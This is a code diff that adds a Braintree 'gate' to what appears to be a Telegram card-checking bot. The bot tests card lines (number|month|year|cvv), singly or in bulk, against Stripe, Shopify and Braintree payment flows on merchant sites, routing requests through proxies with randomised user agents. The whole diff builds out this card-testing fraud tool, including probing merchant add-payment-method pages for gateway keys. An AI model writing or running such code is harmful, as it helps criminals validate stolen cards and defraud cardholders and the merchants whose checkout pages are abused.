@@ -14,6 +14,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 from typing import Dict, Any, Optional
 from datetime import datetime
+from braintree_checker import check_card as b3_check_card
 
 try:
     from faker import Faker
@@ -192,6 +193,7 @@ def set_gate_enabled(gate_key, enabled, by_user=None):
 # ============================================================
 GATE_PROBE_MAP = {
     "auth": {"name": "Stripe Auth (Dilaboards)", "cmd": "/chkapiauth"},
+    "b3": {"name": "Braintree Auth", "cmd": "/chkapib3"},
     "st1": {"name": "HiAPI Check3", "cmd": "/chkapist1"},
     "st5": {"name": "HiAPI Check", "cmd": "/chkapist5"},
     "autosho": {"name": "Shopify Auto", "cmd": "/chkapiautosho"},
@@ -212,6 +214,15 @@ def probe_gate(gate_key):
             resp = requests.get('https://ck.hiapi.club/', headers={'User-Agent': _rand_ua()}, timeout=10, proxies=proxy)
             alive = resp.status_code in (200, 403)
             detail = f"HTTP {resp.status_code}"
+        elif gate_key == "b3":
+            from braintree_checker import _get_domain_url
+            domain = _get_domain_url()
+            if not domain:
+                return False, int((time.time() - start) * 1000), "No site.txt configured"
+            resp = requests.get(f'{domain}/my-account/add-payment-method/',
+                                headers={'User-Agent': _rand_ua()}, timeout=10, allow_redirects=True, proxies=proxy)
+            alive = resp.status_code == 200 and 'braintree' in resp.text.lower()
+            detail = f"HTTP {resp.status_code}" + (" | Braintree key found" if alive else " | No Braintree key")
         elif gate_key == "autosho":
             resp = requests.get('https://teamoicxkiller.online/code/index.php', headers={'User-Agent': _rand_ua()}, timeout=10, proxies=proxy)
             alive = resp.status_code in (200, 400, 403)
@@ -1355,7 +1366,10 @@ def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
 
 def _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict):
     """Run the appropriate gate checker."""
-    if gate == "st1":
+    if gate == "b3":
+        cc_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}"
+        return b3_check_card(cc_line, proxy_dict)
+    elif gate == "st1":
         return check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check3", proxy_dict)
     elif gate == "st5":
         return check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check", proxy_dict)
@@ -1500,6 +1514,7 @@ def fmt_start(is_adm=False):
         "Upload a <b>.txt</b> file, then reply to it with a gate command\n\n"
         "<b>Gates:</b>\n"
         "  /auth       — Stripe Auth (Dilaboards)\n"
+        "  /b3         — Braintree Auth\n"
         "  /autosho    — Shopify Auto (sites.txt) 🔜 Coming Soon\n"
         "  /st1        — HiAPI Check3\n"
         "  /st5        — HiAPI Check\n\n"
@@ -1530,6 +1545,7 @@ def fmt_start(is_adm=False):
         "<b>How to use:</b>\n"
         "  <b>Single:</b> <code>/auth 4111...|01|25|123</code>\n"
         "  <b>Bulk:</b> Send .txt → reply with /auth\n"
+        "  <b>Braintree:</b> <code>/b3 4111...|01|25|123</code>\n"
         "  <b>Shopify:</b> <code>/autosho 4111...|01|25|123</code>\n"
         f"{FOOTER}"
     )
@@ -1832,6 +1848,7 @@ def handle_update(update):
     # --- /chkapi* — Admin-only secret API health checks ---
     chkapi_cmds = {
         "/chkapiauth": "auth",
+        "/chkapib3": "b3",
         "/chkapiautosho": "autosho",
         "/chkapist1": "st1",
         "/chkapist5": "st5",
@@ -1914,6 +1931,7 @@ def handle_update(update):
     if text == "/gates":
         GATE_REGISTRY = [
             ("auth", "/auth", "Stripe Auth (Dilaboards)", True),
+            ("b3", "/b3", "Braintree Auth", True),
             ("autosho", "/autosho", "Shopify Auto 🔜 Soon", False),
             ("st1", "/st1", "HiAPI Check3", True),
             ("st5", "/st5", "HiAPI Check", True),
@@ -2173,7 +2191,7 @@ def handle_update(update):
         return
 
     # --- Gate commands: /auth, /st1, /st5 (single card OR bulk file) ---
-    gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/autosho": ("autosho", "Shopify Auto"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
+    gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/b3": ("b3", "Braintree Auth"), "/autosho": ("autosho", "Shopify Auto"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
     cmd_base = text.split()[0] if text else ""
     if cmd_base in gate_map:
         gate, gate_label = gate_map[cmd_base]
